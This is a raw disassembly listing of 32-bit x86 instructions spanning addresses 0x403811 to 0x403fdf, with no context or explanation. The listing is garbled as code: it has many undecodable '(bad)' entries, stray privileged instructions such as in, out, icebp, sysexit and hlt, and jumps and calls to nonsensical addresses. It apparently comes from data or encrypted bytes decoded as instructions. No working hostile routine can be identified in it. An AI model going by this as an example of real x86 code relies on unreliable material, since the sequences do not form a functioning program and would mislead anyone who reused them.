  403811:	mov    ecx,DWORD PTR [ebx+0x45f60881]
  403817:	dec    DWORD PTR [ebx+0x4db80c33]
  40381d:	dec    esi
  40381e:	mov    eax,DWORD PTR [eax]
  403820:	mov    DWORD PTR [ebx],edi
  403822:	mov    esi,DWORD PTR [ebp+0x4]
  403825:	xor    ecx,DWORD PTR [eax+0x5f]
  403828:	mov    ecx,DWORD PTR [ecx-0x3a67410]
  40382e:	push   ecx
  40382f:	leave  
  403830:	mov    eax,DWORD PTR [eax+edi*8]
  403833:	push   ebp
  403834:	test   ah,ch
  403836:	lahf   
  403837:	in     al,dx
  403838:	xor    al,bh
  40383a:	mov    esp,ebp
  40383c:	clc    
  40383d:	test   DWORD PTR [ebp-0x74baff08],ebx
  403843:	cmp    edx,DWORD PTR [eax]
  403845:	pushf  
  403846:	dec    ebp
  403847:	mov    ebp,DWORD PTR [ebx]
  403849:	in     al,dx
  40384a:	mov    ebx,DWORD PTR [ecx-0xc]
  40384d:	push   ecx
  40384e:	icebp  
  40384f:	add    eax,0x77208
  403854:	rol    DWORD PTR [ebp+0x72],0xc7
  403858:	add    al,dh
  40385a:	rol    DWORD PTR [ebp+0x4545f827],0x3
  403861:	cmp    al,0xf8
  403863:	pushf  
  403864:	dec    ebp
  403865:	mov    DWORD PTR [ebx],0x985f8fc
  40386b:	clc    
  40386c:	or     BYTE PTR [ebp+0x45],al
  40386f:	xor    eax,0x7080835
  403874:	pop    es
  403875:	dec    ebp
  403876:	dec    ebp
  403877:	lea    ecx,[ebp+0x72720101]
  40387d:	add    BYTE PTR [eax],al
  40387f:	dec    ebp
  403880:	inc    ebp
  403881:	sub    ebx,0x10518b59
  403887:	or     DWORD PTR [ebp-0x61],0x8b8b322b
  40388e:	cld    
  40388f:	adc    cl,dh
  403891:	scas   eax,DWORD PTR es:[edi]
  403892:	or     BYTE PTR [ebx],bh
  403894:	pop    es
  403895:	xadd   ebp,ebp
  403898:	jb     0x40389a
  40389a:	add    BYTE PTR [ebx+0x4d2910c1],cl
  4038a0:	inc    ebp
  4038a1:	sub    eax,DWORD PTR [ebx]
  4038a3:	mov    edi,eax
  4038a5:	lock dec ebp
  4038a7:	icebp  
  4038a8:	add    ecx,DWORD PTR [eax]
  4038aa:	clc    
  4038ab:	pop    es
  4038ac:	mov    eax,ecx
  4038ae:	data16 jb 0x4038b9
  4038b1:	add    BYTE PTR [ebp-0x3f],al
  4038b4:	xor    eax,0x7450830
  4038b9:	add    ecx,DWORD PTR [ebp-0x8]
  4038bc:	lea    ecx,[ebp+0x1]
  4038bf:	add    esi,DWORD PTR [edx-0x8]
  4038c2:	add    BYTE PTR [ecx],dl
  4038c4:	inc    ebp
  4038c5:	adc    bl,ch
  4038c7:	dec    ecx
  4038c8:	mov    ecx,DWORD PTR [ecx+0x45450408]
  4038ce:	mov    esi,DWORD PTR ds:0x74d080c
  4038d4:	mov    cl,BYTE PTR [ebp-0x78]
  4038d7:	lea    ecx,[ebx-0x768d07ff]
  4038dd:	add    al,bh
  4038df:	inc    ebp
  4038e0:	in     al,0xe9
  4038e2:	inc    DWORD PTR [eax]
  4038e4:	leave  
  4038e5:	add    BYTE PTR [eax*2-0x71374ab],cl
  4038ec:	push   ecx
  4038ed:	rol    DWORD PTR [ebp+0x4d],0x38
  4038f1:	sbb    DWORD PTR [ecx+ebx*2-0x7e07ae39],0x32f89f85
  4038fc:	sar    BYTE PTR [ebx],0x74
  4038ff:	jbe    0x40388c
  403901:	mov    edi,esp
  403903:	or     BYTE PTR [ecx+0x45],bl
  403906:	push   ecx
  403907:	mov    eax,DWORD PTR ds:0x4d720c
  40390d:	mov    eax,DWORD PTR [ebp-0x77]
  403910:	jne    0x40389d
  403912:	jmp    0x403908
  403914:	mov    ebx,DWORD PTR [ecx-0x8]
  403917:	push   ecx
  403918:	pop    ecx
  403919:	mov    edx,DWORD PTR [ecx-0x8]
  40391c:	add    eax,0x9f7284
  403921:	xor    cl,BYTE PTR [ebp-0x77]
  403924:	sub    edi,eax
  403926:	mov    DWORD PTR [ebx+0xc],ebx
  403929:	inc    ebp
  40392a:	inc    ebp
  40392b:	mov    esi,DWORD PTR ds:0x7c108f8
  403931:	dec    ebp
  403932:	lahf   
  403933:	xor    DWORD PTR [edx],0x8518b59
  403939:	or     DWORD PTR [ebp-0x61],0x3beb3288
  403940:	leave  
  403941:	jbe    0x40394b
  403943:	mov    edx,DWORD PTR [ebp+0x8]
  403946:	in     al,dx
  403947:	inc    ebp
  403948:	in     al,dx
  403949:	mov    eax,DWORD PTR [edx]
  40394b:	or     al,0x0
  40394d:	dec    ebp
  40394e:	inc    ebp
  40394f:	data16 cmp BYTE PTR [ecx],cl
  403952:	pushf  
  403953:	mov    edi,eax
  403955:	mov    esi,eax
  403957:	cld    
  403958:	test   DWORD PTR [ecx-0x8],ebx
  40395b:	push   ecx
  40395c:	inc    ebp
  40395d:	mov    ecx,DWORD PTR [ebx-0x3f7bf708]
  403963:	lahf   
  403964:	pop    es
  403965:	xor    al,al
  403967:	mov    DWORD PTR [ebp-0x74e8ff08],esp
  40396d:	inc    ebp
  40396e:	or     al,0x3
  403970:	sar    al,0xf2
  403973:	dec    ebp
  403974:	lea    eax,[ebx]
  403976:	in     al,0xf8
  403978:	dec    DWORD PTR [ecx]
  40397a:	mov    DWORD PTR [eax],ecx
  40397c:	cld    
  40397d:	inc    ebp
  40397e:	inc    ebp
  40397f:	inc    eax
  403980:	mov    DWORD PTR [ebp-0x14],eax
  403983:	jmp    0xff9737cd
  403988:	mov    edi,0x70008c2
  40398d:	mov    eax,edi
  40398f:	push   ecx
  403990:	lahf   
  403991:	(bad)  
  403992:	xor    bh,ah
  403994:	add    eax,DWORD PTR [ebp+0x4510f889]
  40399a:	inc    ebp
  40399b:	cmp    ebp,eax
  40399d:	pushf  
  40399e:	std    
  40399f:	xor    edi,edi
  4039a1:	inc    eax
  4039a2:	fadd   DWORD PTR [eax+0x45]
  4039a5:	inc    ebp
  4039a6:	mov    esi,DWORD PTR ds:0x7510814
  4039ac:	inc    ebp
  4039ad:	lahf   
  4039ae:	xor    DWORD PTR [edx],0x8
  4039b1:	cmp    DWORD PTR [ebp+0xc],eax
  4039b4:	mov    eax,DWORD PTR [edx]
  4039b6:	clc    
  4039b7:	sub    al,0x40
  4039b9:	inc    ebp
  4039ba:	call   0xff4934f4
  4039bf:	pop    es
  4039c0:	inc    ebp
  4039c1:	lahf   
  4039c2:	push   DWORD PTR [edx]
  4039c4:	adc    BYTE PTR [ebx-0x3717f3ab],cl
  4039ca:	std    
  4039cb:	dec    ebp
  4039cc:	dec    DWORD PTR [ebx+0x5908fcdb]
  4039d2:	inc    ebp
  4039d3:	push   ecx
  4039d4:	call   0xffb335de
  4039d9:	add    BYTE PTR [ebp+0x4d],al
  4039dc:	xor    eax,DWORD PTR [ebx]
  4039de:	add    ecx,DWORD PTR [eax+edx*2]
  4039e1:	add    DWORD PTR [ebp-0x45],esi
  4039e4:	inc    edx
  4039e6:	cld    
  4039e7:	add    BYTE PTR [ecx],dh
  4039e9:	mov    edi,edi
  4039eb:	or     DWORD PTR [ebx-0x30ff0be4],0xc1f4cec7
  4039f5:	test   DWORD PTR [esi],ebx
  4039f7:	clc    
  4039f8:	inc    ebp
  4039f9:	inc    ebp
  4039fa:	mov    edi,DWORD PTR [ebx]
  4039fc:	mov    DWORD PTR [esp+ecx*1-0x74efba75],ebx
  403a03:	inc    ebp
  403a04:	or     al,0x85
  403a06:	shl    BYTE PTR [ebp+0x3b],0x33
  403a0a:	jne    0x4039f5
  403a0c:	xor    eax,DWORD PTR [eax]
  403a0e:	pop    edi
  403a0f:	add    BYTE PTR [ebx+0x45],bl
  403a12:	ret    0x85
  403a15:	je     0x403a5c
  403a17:	push   ebx
  403a18:	mov    eax,DWORD PTR [ebp-0xe02e8]
  403a1e:	mov    eax,DWORD PTR [ebp-0x75]
  403a21:	mov    ecx,DWORD PTR [esp+ecx*1]
  403a24:	in     al,dx
  403a25:	inc    ebp
  403a26:	or     DWORD PTR [ebx+0x5753f408],0x57
  403a2d:	pop    ecx
  403a2e:	test   BYTE PTR [ecx+0x0],dl
  403a31:	xor    eax,DWORD PTR [eax]
  403a33:	mov    esi,0x8472c0
  403a38:	add    dh,al
  403a3a:	add    BYTE PTR [ebp-0x49],al
  403a3d:	mov    esp,DWORD PTR [eax]
  403a3f:	or     al,0xc8
  403a41:	add    BYTE PTR [ebp-0x1],al
  403a44:	xor    ecx,DWORD PTR [ebx+0x8f88b21]
  403a4a:	inc    ebx
  403a4b:	inc    eax
  403a4c:	add    bl,ch
  403a4e:	xor    ecx,DWORD PTR [ebx-0x17f5f37f]
  403a54:	add    BYTE PTR [ecx+0x45f4f889],cl
  403a5a:	mov    eax,DWORD PTR gs:[eax]
  403a5d:	sub    cl,cl
  403a5f:	retf   0xff7c
  403a62:	mov    WORD PTR [ebp+0x10],cx
  403a66:	jae    0x403add
  403a68:	lea    ecx,[ebx+0x63fffcf6]
  403a6e:	xor    edi,edi
  403a70:	jne    0x8bcbafc3
  403a76:	or     al,0xfc
  403a78:	or     al,0x3e
  403a7a:	push   WORD PTR [ecx-0x75]
  403a7e:	jne    0x403a70
  403a80:	cmpxchg8b QWORD PTR [ecx]
  403a83:	(bad)  
  403a84:	mov    ch,0xff
  403a86:	add    ah,ch
  403a88:	data16 jne 0x403a5a
  403a8b:	call   0xff9e339c
  403a90:	cmovge edi,edx
  403a93:	xor    edi,DWORD PTR [ebx+eax*1]
  403a96:	add    BYTE PTR [ebx],bh
  403a98:	sub    eax,0xf8b5d74
  403a9d:	or     al,0xfa
  403a9f:	add    BYTE PTR [edi],cl
  403aa1:	inc    ebp
  403aa2:	cmp    al,0x8b
  403aa4:	mov    ebx,0x4d3b08
  403aa9:	sub    DWORD PTR [ebx],0x14
  403aac:	enterw 0x9ff8,0x3b
  403ab1:	shl    BYTE PTR [esi+ebx*2+0x6a],0xc9
  403ab6:	pop    edi
  403ab7:	or     al,0x45
  403ab9:	mov    esp,DWORD PTR [esi-0x8]
  403abc:	dec    ebp
  403abd:	inc    eax
  403abe:	data16 jmp 0x403b0e
  403ac1:	push   ebp
  403ac2:	jb     0x403ab0
  403ac4:	jmp    0x403b0b
  403ac6:	inc    DWORD PTR [ebx+0x7d7f10f8]
  403acc:	mov    eax,DWORD PTR [eax]
  403ace:	or     BYTE PTR [esi-0x49],dl
  403ad1:	jo     0x74406c86
  403ad7:	test   DWORD PTR [edx+0xf],eax
  403ada:	jmp    DWORD PTR [edi+0xf77000f]
  403ae0:	inc    DWORD PTR [eax+0x33]
  403ae3:	mov    ebx,DWORD PTR [edi-0x77]
  403ae6:	pop    ebx
  403ae7:	lock ret 0xd2
  403aeb:	push   ebp
  403aec:	dec    ebp
  403aed:	mov    eax,0xf68a81
  403af2:	dec    eax
  403af4:	ror    ax,0x3b
  403af8:	rol    BYTE PTR [eax],0x3b
  403afb:	dec    ebp
  403afc:	lock adc DWORD PTR [esp+edi*8+0x6a5533eb],0xffffffec
  403b05:	pop    edi
  403b06:	in     al,dx
  403b07:	cmp    edx,DWORD PTR [edi-0xc]
  403b0a:	clc    
  403b0b:	xchg   DWORD PTR fs:[edx-0xff3bff],esi
  403b12:	cmp    al,dh
  403b14:	jne    0x403acd
  403b16:	xor    edi,esp
  403b18:	jmp    0xcd3c7a
  403b1d:	mov    ebp,DWORD PTR [ecx+edi*1]
  403b20:	jne    0x403b24
  403b22:	call   0xfff8385e
  403b27:	mov    edi,0x14e97
  403b2c:	add    BYTE PTR [ebx],bh
  403b2e:	inc    edi
  403b2f:	jne    0x403aba
  403b31:	mov    esi,DWORD PTR [eax+ecx*1-0x7f7648b9]
  403b38:	mov    eax,0x8974471f
  403b3d:	mov    edi,DWORD PTR [eax+ecx*1+0x6600b787]
  403b44:	add    BYTE PTR [esi+0xa8d1f45],bh
  403b4a:	stos   BYTE PTR es:[edi],al
  403b4b:	add    BYTE PTR [eax],al
  403b4d:	mov    bx,di
  403b50:	les    esi,FWORD PTR [ebx]
  403b52:	xchg   DWORD PTR [esi+0x0],esp
  403b55:	iret   
  403b56:	add    BYTE PTR [edx],dl
  403b58:	inc    ebp
  403b59:	jle    0x403ae8
  403b5b:	(bad)  
  403b5c:	out    dx,al
  403b5d:	cld    
  403b5e:	add    BYTE PTR [ebx+0x39ccf489],cl
  403b64:	xchg   esp,edi
  403b66:	add    DWORD PTR [eax+eax*1-0x72babafa],ebp
  403b6d:	push   0x32
  403b6f:	pop    edi
  403b70:	add    BYTE PTR [ebp-0x77],dh
  403b73:	paddq  mm1,mm2
  403b76:	xchg   DWORD PTR [ecx+eax*1],edi
  403b79:	add    BYTE PTR [eax],al
  403b7b:	adc    ecx,DWORD PTR [ecx+0x457eb083]
  403b81:	test   eax,ebp
  403b83:	inc    DWORD PTR [eax]
  403b85:	inc    DWORD PTR [eax]
  403b87:	ror    BYTE PTR [ebx+0xc9a85e],0x8
  403b8e:	dec    DWORD PTR [ebx-0x3e020718]
  403b94:	inc    esp
  403b96:	inc    ebp
  403b97:	inc    DWORD PTR [ebp-0x52ccf0cd]
  403b9d:	data16 add BYTE PTR [ebp-0x75],cl
  403ba1:	(bad)  
  403ba3:	rcl    BYTE PTR [esi-0x1e],0x74
  403ba7:	mov    edi,DWORD PTR [eax-0x7d]
  403baa:	lock push eax
  403bac:	jle    0x403b39
  403bae:	mov    ecx,DWORD PTR [ebx+0x56a81c]
  403bb4:	mov    eax,DWORD PTR [ebx+0x7f80018]
  403bba:	jge    0x403b7c
  403bbc:	mov    esi,DWORD PTR [eax]
  403bbe:	adc    al,0x0
  403bc0:	enter  0xd06a,0xff
  403bc4:	dec    ebp
  403bc5:	or     BYTE PTR [ecx+0x7dffe4c1],cl
  403bcb:	mov    edi,DWORD PTR [ebx]
  403bcd:	lods   al,BYTE PTR ds:[esi]
  403bce:	ja     0x403bd0
  403bd0:	mov    DWORD PTR [ebp+0x45db22f8],ecx
  403bd6:	pop    ebp
  403bd7:	lea    edi,[ecx]
  403bd9:	inc    esp
  403bda:	clc    
  403bdb:	inc    ebp
  403bdc:	outs   dx,BYTE PTR ds:[esi]
  403bdd:	lea    eax,[ebx]
  403bdf:	push   bp
  403be1:	inc    ebp
  403be2:	mov    ecx,DWORD PTR [ebp+0xb788e0]
  403be8:	pop    edi
  403be9:	mov    DWORD PTR [esi-0x40],ebx
  403bec:	jae    0x403b75
  403bee:	cmp    eax,DWORD PTR [eax]
  403bf0:	adc    al,0x0
  403bf2:	pop    eax
  403bf3:	inc    ebp
  403bf4:	sbb    al,0x8d
  403bf6:	mov    ecx,esp
  403bf8:	or     BYTE PTR [eax],al
  403bfa:	cmp    al,0x89
  403bfc:	mov    eax,ecx
  403bfe:	cld    
  403bff:	xchg   DWORD PTR [ebp+0x0],edx
  403c02:	add    eax,DWORD PTR [eax]
  403c04:	add    eax,DWORD PTR [ebp+0x2b]
  403c07:	lea    ecx,[eax]
  403c09:	adc    BYTE PTR [ebp+0x0],al
  403c0c:	or     ecx,DWORD PTR [ecx-0x78763000]
  403c12:	fadd   QWORD PTR [ecx]
  403c14:	push   ebp
  403c15:	add    BYTE PTR [ebx+0x1b8d0045],al
  403c1b:	push   esp
  403c1c:	inc    ebp
  403c1d:	add    bh,bh
  403c1f:	push   edi
  403c20:	adc    BYTE PTR [ebp-0x18],bh
  403c23:	mov    ebp,edi
  403c25:	fdivr  st,st(7)
  403c27:	cli    
  403c28:	dec    ebp
  403c29:	add    BYTE PTR [ebp-0x74788bb0],al
  403c2f:	add    esp,edi
  403c31:	add    BYTE PTR [eax],bh
  403c33:	xor    BYTE PTR [ebp-0x51],al
  403c36:	cmp    edi,0xfffffffc
  403c39:	mov    edi,edi
  403c3b:	lock in al,dx
  403c3d:	rcl    ah,0x84
  403c40:	pop    ebp
  403c41:	add    BYTE PTR [ebx+0x0],al
  403c44:	pop    ebp
  403c45:	dec    eax
  403c46:	cmp    edx,DWORD PTR [ebx-0x8]
  403c49:	mov    edx,DWORD PTR [ecx+eax*1-0x7436fca5]
  403c50:	add    al,0x24
  403c52:	push   ebp
  403c53:	dec    esi
  403c54:	in     al,dx
  403c55:	mov    eax,DWORD PTR [ebp+0x20]
  403c58:	push   esi
  403c59:	pop    esi
  403c5a:	mov    al,0x3
  403c5c:	add    DWORD PTR [ecx+0x7eb0e000],ecx
  403c62:	add    DWORD PTR [ebx],eax
  403c64:	add    BYTE PTR [ebx],al
  403c66:	inc    ebp
  403c67:	mov    eax,ebp
  403c69:	hlt    
  403c6a:	(bad)  
  403c6b:	push   ebp
  403c6c:	dec    DWORD PTR [ecx-0x4fe07f2]
  403c72:	push   es
  403c73:	add    ecx,ecx
  403c75:	pop    ebp
  403c76:	or     BYTE PTR [ebx],dh
  403c78:	jns    0x5e02253f
  403c7e:	ret    0x76
  403c81:	jmp    0x403c12
  403c83:	mov    eax,DWORD PTR [ecx]
  403c85:	in     al,0x0
  403c87:	jge    0x403c74
  403c89:	sysexit 
  403c8b:	cmp    al,0x8a
  403c8d:	cmp    eax,DWORD PTR [eax]
  403c8f:	sbb    BYTE PTR [edx],cl
  403c91:	pop    ebp
  403c92:	add    BYTE PTR [esi+0x66],bh
  403c95:	jae    0x403c98
  403c97:	mov    eax,ecx
  403c99:	call   0xb9b7:0x8b025583
  403ca0:	mov    ebx,0x8d4e55
  403ca5:	mov    al,0x3b
  403ca7:	fdiv   DWORD PTR [ebp-0x8]
  403caa:	xor    edx,DWORD PTR [ebp+0x66]
  403cad:	mov    DWORD PTR [ecx],0x10087ec
  403cb3:	add    BYTE PTR [eax],al
  403cb5:	push   ebp
  403cb6:	ret    
  403cb7:	mov    ecx,DWORD PTR [ebx-0x77c57404]
  403cbd:	jne    0x403cbf
  403cbf:	mov    eax,ecx
  403cc1:	fadd   QWORD PTR [esi]
  403cc3:	xor    al,0xc7
  403cc5:	push   ebx
  403cc6:	or     dh,dh
  403cc8:	icebp  
  403cc9:	inc    DWORD PTR [eax+0x8f4348b]
  403ccf:	rol    BYTE PTR [edx+0x5],0xa
  403cd3:	inc    ebp
  403cd4:	stc    
  403cd5:	mov    DWORD PTR [ebp-0x75],esi
  403cd8:	(bad)  
  403cd9:	lock add BYTE PTR [ebp-0x7a],al
  403cdd:	add    al,0x1
  403cdf:	dec    ebp
  403ce0:	add    BYTE PTR [ebp-0x39],dh
  403ce3:	mov    eax,ebx
  403ce5:	call   0xe8c3c675
  403cea:	sbb    al,0x5d
  403cec:	mov    edi,0xf85e8572
  403cf1:	pop    edi
  403cf2:	jge    0x403cb6
  403cf4:	lea    eax,[eax]
  403cf6:	add    ecx,DWORD PTR [ebx+0x88b8b45]
  403cfc:	or     bh,bh
  403cfe:	leave  
  403cff:	fadd   DWORD PTR [eax+eax*1-0x67ff7300]
  403d06:	dec    ebp
  403d07:	add    BYTE PTR [ebp-0xff7f075],al
  403d0d:	xchg   ebp,eax
  403d0e:	add    bh,bh
  403d10:	mov    ecx,DWORD PTR [ebx-0x74b276f0]
  403d16:	mov    esi,DWORD PTR [ebx]
  403d18:	or     al,0x39
  403d1a:	dec    ebp
  403d1b:	pop    esi
  403d1c:	mov    edx,DWORD PTR [ebp+0x5d458b08]
  403d22:	jmp    0xec88:0x898b9c04
  403d29:	add    BYTE PTR [ecx-0x76ec17ad],cl
  403d2f:	inc    ebx
  403d30:	or     al,0x0
  403d32:	dec    ebp
  403d33:	add    eax,0x103bc7
  403d38:	test   DWORD PTR [ecx+0x25983f8],ecx
  403d3e:	push   ecx
  403d3f:	ret    0xfbb
  403d42:	lea    eax,[edx]
  403d44:	push   DWORD PTR [ebp+0x66330045]
  403d4a:	mov    eax,ebx
  403d4c:	sub    esp,eax
  403d4e:	add    eax,eax
  403d50:	clc    
  403d51:	mov    DWORD PTR [ebx-0x7477ff75],edx
  403d57:	add    BYTE PTR [ebx+ebx*2],cl
  403d5a:	dec    ebp
  403d5b:	push   edi
  403d5c:	xor    edi,eax
  403d5e:	xor    eax,DWORD PTR [esi+0x8018d]
  403d64:	in     eax,0xe7
  403d66:	add    BYTE PTR [ebx],al
  403d68:	inc    ebp
  403d69:	jmp    0x403d9e
  403d6b:	xor    bh,0x4a
  403d6e:	mov    ebp,ecx
  403d70:	adc    BYTE PTR [eax-0x75ccbfb3],cl
  403d76:	xor    eax,DWORD PTR [eax-0x10c481d5]
  403d7c:	jne    0x403d7e
  403d7e:	mov    ecx,DWORD PTR [ebx+0x458808]
  403d84:	mov    eax,DWORD PTR [ebx]
  403d86:	hlt    
  403d87:	pop    edi
  403d88:	add    BYTE PTR [ebp-0x37],dl
  403d8b:	in     al,dx
  403d8c:	push   es
  403d8d:	in     al,dx
  403d8e:	dec    edx
  403d8f:	push   edi
  403d90:	xor    al,0x38
  403d92:	pop    ss
  403d93:	pushf  
  403d94:	dec    ebp
  403d95:	mov    DWORD PTR [eax+0x614759e8],eax
  403d9b:	mov    ecx,edx
  403d9d:	in     al,0x4d
  403d9f:	dec    ebp
  403da0:	add    BYTE PTR [ebp-0x43df0a7],0xe9
  403da7:	add    dl,dl
  403da9:	mov    ecx,DWORD PTR [ebx+0x4dc9080c]
  403daf:	test   BYTE PTR [eax+0x8008b00],cl
  403db5:	dec    ebp
  403db6:	push   ebp
  403db7:	mov    DWORD PTR [eax+0x4d72f4],edi
  403dbd:	mov    eax,ecx
  403dbf:	clc    
  403dc0:	into   
  403dc1:	dec    ebp
  403dc2:	retf   0x18c7
  403dc5:	lock dec ebp
  403dc7:	test   DWORD PTR [ebx-0x31baf308],ecx
  403dcd:	push   ebx
  403dce:	(bad)  
  403dcf:	jge    0x403d9b
  403dd1:	push   esi
  403dd2:	enter  0xce45,0x89
  403dd6:	dec    ebp
  403dd7:	cld    
  403dd8:	jmp    0xff7b3d22
  403ddd:	pushf  
  403dde:	inc    ebp
  403ddf:	mov    esi,0x78b0833
  403de4:	sub    esp,DWORD PTR [ecx+0x3]
  403de7:	int    0x8
  403de9:	mov    ecx,DWORD PTR [ebp+0xc]
  403dec:	mov    eax,esi
  403dee:	adc    bl,cl
  403df0:	(bad)  
  403df1:	enter  0x4d85,0xff
  403df5:	jmp    0x853ef9
  403dfa:	xor    eax,DWORD PTR [ebp+0x5e]
  403dfd:	mov    ebp,ebx
  403dff:	or     al,0x8b
  403e01:	(bad)  
  403e02:	call   0x51cc97d5
  403e07:	ds add eax,0x8b7264
  403e0d:	or     cl,cl
  403e0f:	ror    BYTE PTR [ecx+esi*8],cl
  403e12:	push   ebp
  403e13:	inc    ebp
  403e14:	in     al,dx
  403e15:	mov    ebp,esp
  403e17:	or     al,0xc7
  403e19:	(bad)  
  403e1a:	lock into 
  403e1c:	test   ecx,eax
  403e1e:	clc    
  403e1f:	rol    BYTE PTR [ebp+0x34],1
  403e22:	cmp    eax,DWORD PTR [ebp-0x64]
  403e25:	add    ecx,DWORD PTR [ebx-0x7b27604]
  403e2b:	mov    al,BYTE PTR [ebp-0x7b]
  403e2e:	xor    BYTE PTR [ebp-0x64],dh
  403e31:	xor    al,0x56
  403e33:	sub    al,0xc7
  403e35:	jmp    0x403e23
  403e37:	mov    ebx,DWORD PTR [eax]
  403e39:	lock jmp 0xf02a:0x8bb27df1
  403e41:	mov    ebx,DWORD PTR [ecx-0x14]
  403e44:	push   ecx
  403e45:	icebp  
  403e46:	xor    eax,DWORD PTR [edx]
  403e48:	mov    edx,0x617280
  403e4d:	enter  0x4dc8,0xfa
  403e51:	add    ecx,edx
  403e53:	cld    
  403e54:	scas   eax,DWORD PTR es:[edi]
  403e55:	add    ebx,ebp
  403e57:	dec    ebp
  403e58:	mov    ecx,DWORD PTR [ebx-0x608a1708]
  403e5e:	xor    esi,DWORD PTR [edx]
  403e60:	xor    ebp,DWORD PTR [ebx]
  403e62:	add    esi,DWORD PTR [ebx]
  403e64:	add    edi,DWORD PTR [ebx]
  403e66:	test   DWORD PTR [ebp-0x75],esi
  403e69:	mov    edi,eax
  403e6b:	adc    BYTE PTR [ebp+0x55],cl
  403e6e:	je     0x403ea3
  403e70:	xor    esi,DWORD PTR [ebx]
  403e72:	xor    ebp,DWORD PTR [ebx]
  403e74:	add    ebp,DWORD PTR [ebx]
  403e76:	add    esi,DWORD PTR [ebx]
  403e78:	ror    DWORD PTR [ecx+0x68ec108b],cl
  403e7e:	enter  0xcaff,0x8b
  403e82:	icebp  
  403e83:	or     al,0xa
  403e85:	(bad)  
  403e86:	lock retf 
  403e88:	enter  0xf2c8,0x4d
  403e8c:	retf   0xee89
  403e8f:	or     BYTE PTR [ebp+0x45],dh
  403e92:	mov    edi,DWORD PTR [ebx]
  403e94:	cld    
  403e95:	bswap  eax
  403e97:	pop    edi
  403e98:	mov    esp,0x328b9fff
  403e9d:	in     al,0x8b
  403e9f:	(bad)  
  403ea0:	hlt    
  403ea1:	pop    ebx
  403ea2:	jne    0x403eac
  403ea4:	xor    eax,DWORD PTR [ebp+0x33]
  403ea7:	xor    eax,0x73b082b
  403eac:	jbe    0x403e4d
  403eae:	mov    esi,DWORD PTR [edx]
  403eb0:	clc    
  403eb1:	pop    edi
  403eb2:	mov    edx,eax
  403eb4:	mov    eax,DWORD PTR [eax]
  403eb6:	clc    
  403eb7:	mov    ecx,ecx
  403eb9:	adc    DWORD PTR [ebp+0x14],0xffffffec
  403ebd:	inc    ebp
  403ebe:	in     al,dx
  403ebf:	cmp    BYTE PTR [esp+ebx*4],al
  403ec2:	add    bh,al
  403ec4:	inc    ebp
  403ec5:	cld    
  403ec6:	cmp    BYTE PTR [ebp+0x3c7f89c],al
  403ecc:	hlt    
  403ecd:	inc    ebp
  403ece:	test   edi,eax
  403ed0:	clc    
  403ed1:	hlt    
  403ed2:	inc    ebp
  403ed3:	test   DWORD PTR [eax],edi
  403ed5:	clc    
  403ed6:	pushf  
  403ed7:	push   edi
  403ed8:	push   ebx
  403ed9:	inc    ebp
  403eda:	inc    ebp
  403edb:	fdivr  DWORD PTR [ecx]
  403edd:	xlat   BYTE PTR ds:[ebx]
  403ede:	pushf  
  403edf:	mov    ecx,DWORD PTR [ebx-0x41b21304]
  403ee5:	mov    eax,0x7070808
  403eea:	xor    edi,eax
  403eec:	mov    edi,0x32729f
  403ef1:	xor    eax,edi
  403ef3:	add    eax,DWORD PTR [ebp+0x3]
  403ef6:	(bad)  
  403ef7:	pavgb  mm7,mm1
  403efa:	test   DWORD PTR [esi-0x8],eax
  403efd:	dec    ebp
  403efe:	inc    ebp
  403eff:	mov    ebx,eax
  403f01:	cld    
  403f02:	xlat   BYTE PTR ds:[ebx]
  403f03:	enter  0xf0c7,0xf0
  403f07:	retf   0xf200
  403f0a:	add    dh,cl
  403f0c:	leave  
  403f0d:	jne    0x403f54
  403f0f:	mov    ecx,DWORD PTR [ebx-0x39ea1304]
  403f15:	enter  0xf0ce,0xc7
  403f19:	retf   0xf2cf
  403f1c:	scas   eax,DWORD PTR es:[edi]
  403f1d:	out    dx,al
  403f1e:	jmp    0x403f6d
  403f20:	mov    esi,DWORD PTR [ebx]
  403f22:	cld    
  403f23:	add    eax,edi
  403f25:	xor    eax,esi
  403f27:	jmp    0x403f6e
  403f29:	xor    ecx,DWORD PTR [ebp-0x1ffc07cd]
  403f2f:	add    edi,edi
  403f31:	ror    DWORD PTR [ecx+0x45f8f889],cl
  403f37:	dec    ebp
  403f38:	mov    esi,DWORD PTR [ebx]
  403f3a:	cld    
  403f3b:	lea    eax,[edi+ecx*1+0xff72e0]
  403f42:	mov    ecx,DWORD PTR [ebp-0xc]
  403f45:	mov    ecx,DWORD PTR [ebp-0x4]
  403f48:	xor    esi,eax
  403f4a:	(bad)  
  403f4b:	enter  0xce08,0x72
  403f4f:	stc    
  403f50:	add    BYTE PTR [edx+0x5f8b4545],ch
  403f56:	call   0x33858c5e
  403f5b:	pop    esi
  403f5c:	xor    eax,ebx
  403f5e:	sub    ecx,DWORD PTR [ebx+0x20fc818b]
  403f64:	enter  0xb900,0xc7
  403f68:	inc    ebp
  403f69:	in     al,dx
  403f6a:	xor    eax,DWORD PTR [ebp+0x4589f803]
  403f70:	clc    
  403f71:	cmp    eax,DWORD PTR [ebp-0x64]
  403f74:	cmp    edi,eax
  403f76:	pushf  
  403f77:	call   0xf92bc607
  403f7c:	mov    eax,edi
  403f7e:	loopne 0x403f64
  403f80:	inc    ebp
  403f81:	test   DWORD PTR [ebx],esi
  403f83:	clc    
  403f84:	add    eax,DWORD PTR [ebp-0x2d]
  403f87:	push   esi
  403f88:	mov    DWORD PTR [ecx-0x4],ebx
  403f8b:	push   ecx
  403f8c:	inc    ebp
  403f8d:	push   edi
  403f8e:	mov    al,dh
  403f90:	mov    BYTE PTR [edi+0x34d320b],bl
  403f96:	mov    ecx,DWORD PTR [ecx+0x45b6f8f8]
  403f9c:	xor    esi,DWORD PTR [eax]
  403f9e:	mov    DWORD PTR [eax+ecx*1-0x7403b239],ebx
  403fa5:	sbb    BYTE PTR [eax],cl
  403fa7:	jmp    0xca:0x8cf45ce
  403fae:	mov    WORD PTR [ebx-0xb007420],cs
  403fb4:	mov    ecx,DWORD PTR [ebp-0x4]
  403fb7:	xor    ecx,edx
  403fb9:	xor    ecx,DWORD PTR [ebp+0x3]
  403fbc:	mov    eax,DWORD PTR [ebx]
  403fbe:	hlt    
  403fbf:	bswap  esi
  403fc1:	rol    DWORD PTR [ecx+esi*1+0x2b32459f],0x89
  403fc9:	xor    ecx,DWORD PTR [eax]
  403fcb:	mov    DWORD PTR [ebp-0x8],eax
  403fce:	xor    ebx,DWORD PTR [ebp-0x47]
  403fd1:	call   0x403e63
  403fd6:	enter  0x4d45,0x8b
  403fda:	mov    eax,edi
  403fdc:	lock dec ebp
  403fde:	inc    ebp
  403fdf:	mov    DWORD PTR [ebx-0x39040f73],ecx
